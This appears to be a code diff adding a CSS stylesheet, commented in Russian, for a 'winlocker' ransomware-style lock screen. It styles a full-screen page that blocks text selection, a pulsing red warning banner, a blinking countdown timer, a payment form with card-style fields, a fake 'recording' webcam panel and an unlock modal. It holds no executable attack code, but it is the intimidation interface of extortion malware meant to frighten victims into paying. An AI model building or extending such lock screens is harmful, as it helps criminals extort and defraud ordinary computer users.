@@ -1,0 +1,445 @@
+/* Общие стили */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Arial, sans-serif;
+}
+
+body {
+    background-color: #000;
+    color: #fff;
+    overflow: hidden;
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    cursor: not-allowed;
+}
+
+/* Основной контейнер винлокера */
+.winlocker {
+    width: 100vw;
+    height: 100vh;
+    background-color: #0a0a0a;
+    background-image: url('https://i.imgur.com/JYkJbKU.jpg');
+    background-size: cover;
+    background-position: center;
+    background-blend-mode: overlay;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+}
+
+/* Заголовок */
+.header {
+    background-color: #c10000;
+    padding: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+    animation: pulse 1.5s infinite;
+}
+
+@keyframes pulse {
+    0% {
+        background-color: #c10000;
+    }
+    50% {
+        background-color: #ff0000;
+    }
+    100% {
+        background-color: #c10000;
+    }
+}
+
+.warning-icon {
+    font-size: 2.5rem;
+    margin-right: 15px;
+    color: #fff;
+}
+
+.header h1 {
+    font-size: 2rem;
+    text-align: center;
+    text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+    letter-spacing: 1px;
+}
+
+/* Основной контент */
+.content {
+    flex: 1;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    max-width: 1200px;
+    margin: 0 auto;
+    width: 100%;
+}
+
+/* Сообщение */
+.message {
+    background-color: rgba(0, 0, 0, 0.8);
+    border: 2px solid #ff0000;
+    padding: 20px;
+    border-radius: 5px;
+    margin-bottom: 20px;
+    box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+}
+
+.alert {
+    font-size: 1.5rem;
+    color: #ff0000;
+    margin-bottom: 15px;
+    font-weight: bold;
+}
+
+.message p {
+    margin-bottom: 15px;
+    line-height: 1.5;
+}
+
+.message ul {
+    margin-left: 25px;
+    margin-bottom: 15px;
+}
+
+.message li {
+    margin-bottom: 8px;
+}
+
+.highlight {
+    color: #ff0000;
+    font-weight: bold;
+    font-size: 1.2em;
+}
+
+.warning {
+    color: #ffcc00;
+    font-weight: bold;
+    border-left: 3px solid #ffcc00;
+    padding-left: 10px;
+}
+
+/* Таймер */
+.timer {
+    background-color: rgba(0, 0, 0, 0.8);
+    border: 2px solid #ff0000;
+    padding: 20px;
+    border-radius: 5px;
+    margin-bottom: 20px;
+    text-align: center;
+    box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+}
+
+.timer p {
+    font-size: 1.2rem;
+    margin-bottom: 10px;
+}
+
+.countdown {
+    font-size: 3rem;
+    font-family: 'Courier New', monospace;
+    color: #ff0000;
+    text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+    animation: blink 1s infinite;
+}
+
+@keyframes blink {
+    0%, 100% {
+        opacity: 1;
+    }
+    50% {
+        opacity: 0.7;
+    }
+}
+
+/* Оплата */
+.payment {
+    background-color: rgba(0, 0, 0, 0.8);
+    border: 2px solid #ff0000;
+    padding: 20px;
+    border-radius: 5px;
+    box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+}
+
+.payment h2 {
+    margin-bottom: 15px;
+    text-align: center;
+    color: #fff;
+}
+
+.payment-methods {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 20px;
+}
+
+.payment-method {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin: 0 15px;
+}
+
+.payment-method i {
+    font-size: 2.5rem;
+    margin-bottom: 5px;
+    color: #fff;
+}
+
+.payment-form {
+    max-width: 500px;
+    margin: 0 auto;
+}
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+.form-row {
+    display: flex;
+    gap: 15px;
+}
+
+.form-row .form-group {
+    flex: 1;
+}
+
+label {
+    display: block;
+    margin-bottom: 5px;
+    color: #fff;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ff0000;
+    background-color: #1a1a1a;
+    color: #fff;
+    border-radius: 3px;
+    font-size: 1rem;
+}
+
+input:focus {
+    outline: none;
+    border-color: #ff3333;
+    box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+}
+
+.pay-btn {
+    width: 100%;
+    padding: 15px;
+    background-color: #ff0000;
+    color: #fff;
+    border: none;
+    border-radius: 3px;
+    font-size: 1.1rem;
+    cursor: pointer;
+    transition: background-color 0.3s;
+    margin-top: 10px;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.pay-btn:hover {
+    background-color: #cc0000;
+    box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+}
+
+/* Футер */
+.footer {
+    background-color: rgba(0, 0, 0, 0.8);
+    padding: 15px;
+    text-align: center;
+    font-size: 0.9rem;
+    color: #999;
+}
+
+.footer p {
+    margin-bottom: 5px;
+}
+
+/* Веб-камера */
+.webcam-container {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    width: 200px;
+    background-color: rgba(0, 0, 0, 0.8);
+    border: 2px solid #ff0000;
+    border-radius: 5px;
+    overflow: hidden;
+    box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+}
+
+.webcam-header {
+    background-color: #ff0000;
+    color: #fff;
+    padding: 5px 10px;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+}
+
+.webcam-header i {
+    margin-right: 5px;
+    animation: record 2s infinite;
+}
+
+@keyframes record {
+    0%, 100% {
+        opacity: 1;
+    }
+    50% {
+        opacity: 0;
+    }
+}
+
+.webcam-feed {
+    height: 150px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: #111;
+}
+
+.webcam-placeholder {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background-color: #333;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.webcam-placeholder i {
+    font-size: 2rem;
+    color: #666;
+}
+
+/* Модальное окно разблокировки */
+.modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.8);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-content {
+    background-color: #1a1a1a;
+    padding: 30px;
+    border-radius: 5px;
+    max-width: 500px;
+    width: 90%;
+    box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+    border: 2px solid #ff0000;
+}
+
+.modal-content h2 {
+    margin-bottom: 15px;
+    color: #ff0000;
+}
+
+.modal-content p {
+    margin-bottom: 15px;
+    line-height: 1.5;
+}
+
+#unlock-button {
+    padding: 12px 20px;
+    background-color: #007bff;
+    color: #fff;
+    border: none;
+    border-radius: 3px;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: background-color 0.3s;
+    width: 100%;
+    margin-top: 10px;
+}
+
+#unlock-button:hover {
+    background-color: #0056b3;
+}
+
+/* Адаптивность */
+@media (max-width: 768px) {
+    .header h1 {
+        font-size: 1.5rem;
+    }
+    
+    .warning-icon {
+        font-size: 1.8rem;
+    }
+    
+    .webcam-container {
+        width: 150px;
+    }
+    
+    .webcam-feed {
+        height: 120px;
+    }
+    
+    .form-row {
+        flex-direction: column;
+        gap: 10px;
+    }
+}
+
+@media (max-width: 480px) {
+    .header h1 {
+        font-size: 1.2rem;
+    }
+    
+    .warning-icon {
+        font-size: 1.5rem;
+        margin-right: 10px;
+    }
+    
+    .webcam-container {
+        display: none;
+    }
+    
+    .countdown {
+        font-size: 2rem;
+    }
+}
+
+/* Анимация глитча для текста */
+@keyframes glitch {
+    0% {
+        transform: translate(0);
+    }
+    20% {
+        transform: translate(-3px, 3px);
+    }
+    40% {
+        transform: translate(-3px, -3px);
+    }
+    60% {
+        transform: translate(3px, 3px);
+    }
+    80% {
+        transform: translate(3px, -3px);
+    }
+    100% {
+        transform: translate(0);
+    }
+}
+
+.header h1 {
+    animation: glitch 0.5s infinite;
+    animation-timing-function: steps(1);
+}
